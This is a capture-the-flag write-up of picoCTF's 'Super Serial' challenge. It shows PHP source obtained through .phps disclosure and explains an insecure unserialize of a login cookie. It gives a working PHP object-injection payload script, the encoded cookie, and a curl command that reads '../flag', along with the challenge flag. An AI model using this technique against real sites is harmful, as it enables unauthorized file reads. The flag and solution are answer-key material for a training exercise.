# **_Super Serial_**
## Description
Try to recover the flag stored on this website `http://mercury.picoctf.net:14804/`
## Solution
Looked around the page but didn't find anything helpful until I went to `robots.txt`
```
User-agent: *
Disallow: /admin.phps
```
There is a filename `admin.phps`, lets take a look, well the server replies `Not Found`
However the filename reminds me of the `phps` extension, which shows the code of a `php` file
Notice `index.php` file used for the index page, change its extention to `phps`
> **_NOTE:_** If you can't find the `index.php` file, try to login then you will see the filename shown in the url

```html
<!--index.php-->
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
Notice that there are two php files, `cookie.php` and `authentication.php`
Lets take a look
```html
<!--cookie.php-->
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
```html
<!--authentication.php-->
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
Analyse how the authentication works for the website
>The webserver creates a `permissions` object with the input username and password, then it checks with the database to identify whether the user is a guest or admin; The webserver then serialize and encode the `permissions` object and set it as cookie, the authentication process grabs the cookie, decode and unserialse the cookie to get the `permissions` object, if the user is an admin, it will log the login date by creating an `access_log` object

Notice that in the progess, after decoding and unserializing the cookie, it runs `is_guest()` and `is_admin()` function of the `permissions` object, it raises an error and print the unserialized object if there is any problem
By reading the hint
>The flag is at ../flag

We know that we should read `../flag`, what we can do here is put an `access_log` object in the cookie, since the object doesn't have an `is_guest()` function, it raises an error and prints the object
Create a `access_log` object with the file `../flag`, serialze it and encode it, make sure you include the `access_log` class from `authentication.php`
```html
<!-- script.php -->
<?php

class access_log
{
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return $this->read_log();
    }

    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this->log_file);
    }
}

echo(urlencode(base64_encode(serialize(new access_log('../flag')))));
?>
```
Run the script to get the value
```console
❯ php script.php
<!-- script.php -->
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9%
```
This step is optional, I decoded the value just to make sure
```console
❯ echo "TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" | base64 -d
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```
`curl` with the cookie `login` to get the flag
```console
❯ curl -s --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;" http://mercury.picoctf.net:14804/authentication.php
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_261d1dcc}
```

